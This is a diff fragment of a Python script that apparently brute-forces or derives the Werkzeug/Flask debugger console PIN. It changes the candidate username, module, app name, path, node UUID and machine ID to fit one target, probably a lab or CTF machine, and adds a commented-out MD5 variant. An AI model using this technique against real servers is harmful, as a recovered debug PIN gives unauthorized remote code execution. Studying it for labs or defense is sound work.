@@ -51,11 +51,11 @@ def crack(hasher, username, modname, appname, flaskapp_path, node_uuid, machine_
 if __name__ == '__main__':
 
     usernames = ['coil']
-    modnames = ['flask.app', 'werkzeug.debug']
-    appnames = ['wsgi_app', 'DebuggedApplication', 'Flask']
+    modnames = ['flask.app']
+    appnames = ['Flask']
     flaskpaths = ['/usr/local/lib/python3.12/site-packages/flask/app.py']
-    nodeuuids = ['147697663950997']
-    machineids = ['40a2ccae-0aa4-486d-b68e-6430336da002']
+    nodeuuids = ['147888320006792']
+    machineids = ['e90c95cf-decb-4b06-866f-95ff2e7bc384']
 
     # Generate all possible combinations of values
     combinations = itertools.product(usernames, modnames, appnames, flaskpaths, nodeuuids, machineids)
@@ -64,6 +64,7 @@ if __name__ == '__main__':
     for combo in combinations:
         username, modname, appname, flaskpath, nodeuuid, machineid = combo
         # print('==========================================================================')
+        # crack_md5(username, modname, appname, flaskpath, nodeuuid, machineid)
         crack_sha1(username, modname, appname, flaskpath, nodeuuid, machineid)
         # print(f'{combo}')
         # print('==========================================================================')
